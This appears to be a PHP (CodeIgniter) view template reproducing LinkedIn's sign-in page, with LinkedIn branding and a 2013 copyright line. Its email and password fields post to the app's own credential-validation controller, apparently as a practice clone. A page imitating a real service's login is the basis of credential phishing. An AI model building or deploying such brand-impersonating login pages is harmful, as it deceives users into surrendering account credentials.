<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="Content-Type" content="text/html"; charset=utf-8">
    <title>Sign In | LinkedIn </title>
    <link rel="favicon" href="favicon.ico" />
    
    <link rel="stylesheet" type="text/css" href="<?php echo base_url();?>application/css/CSS1.css"   media="screen" charset="utf-8">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url();?>application/css/StyleSheet1.css" media="screen" title="notitle" charset="utf-8">

</head>
<body class="en guest v2  chrome-v5 chrome-v5-responsive background-v4 sticky-bg guest" id="pagekey-uas-consumer-login-internal">
<div id="header">
        <div id="wrapper">
            <h2 class="logo-container"><a href="" id="li-logo">LinkedIn Home</a></h2>
            <ul id="header-list">
            
                <li class="nav-item">
                    <a href="screen3.htm" class="nav-link" id="tag_a">
                        What is LinkedIn?
                    </a>
                </li>
                <li class="nav-item">
                    <a href="<?php echo site_url('login/signup') ?>" class="nav-link" id="tag_a">
                        Join Today
                    </a>
                </li>
                <li class="nav-item">
                    <a href="<?php echo site_url('login/index') ?>" class="nav-link" id="tag_a">
                        Sign In
                    </a>
                </li>
               
            </ul>
        </div>
    </div>
    <div class="ally-content">
        <a name="ally-content" tabindex="0" id="ally-content-link">Main content below.</a>
    </div>

















    <div id="main_wrapper">

<div id="body" class="" role="main">

    <h1 id="h1">Sign in to LinkedIn</h1>

<div id="main" class="signin">

 <ul>

        

          <li>
            <label for="session_key-login" >Email address:</label>
            <div class="fieldgroup">
                <span class="error" id="session_key-login-error"></span>
                      <!--  <input type="text" name="session_key" value="" id="session_key-login" tabindex="1"/>-->
                        <?php
                       echo form_open('login/validate_credentials');
                       echo form_input('username','');
                       ?>
             	
            </div>
          </li>
        
        
          <li>
            <label for="session_password-login" >Password:</label>
            <div class="fieldgroup">
                <span class="error" id="session_password-login-error"></span>
      
                       <!-- <input type="password" name="session_password" value="" id="session_password-login" tabindex="2"/>-->
                       <!-- put a div here-->
                    <?php
                       echo form_open('login/validate_credentials');
                       echo form_password('password','');
					   
                       ?>
                       
                    
                
                    <a id="forgot-password" href="screen6.html"  class="nav-linkk">Forgot password?</a>
                  
            </div>
          </li>
        
        <li class="button">
          <!--<input type="submit" name="signin" value="Sign In" tabindex="3" class="btn-primary" id="btn-primary">-->
          			 <?php
                       echo form_open('login/validate_credentials');
                       echo form_submit('submit','Sign In');
					   
                       ?>
                    
          <span> or 
          	<!--<a href="" tracking="signin_join" class="nav-linkk">Join LinkedIn</a></span>-->
          	<?php
                       echo form_open('login/validate_credentials');
                       echo anchor('login/signup','Join LinkedIn');
					   
                       ?>
        </li>
      </ul>
  
      
     
      </div>
      </div>






      


      <div id="footer">
 <div class="wrapper">
 <p id="copyright" class="guest"><span>LinkedIn Corporation</span> &copy; 2013</p>
 <ul id="nav-legal">

 <li><a href="">User Agreement</a></li>
 <li><a href="">Privacy Policy</a></li>
 <li>
 
 <a href=""  rel="nofollow" >Community Guidelines</a>
 </li>
 <li><a href="">Cookie Policy</a></li>
 <li class="last"><a href="">Copyright Policy</a></li>
 </ul>
 </div>
</div>
</div>
</body>
</html>
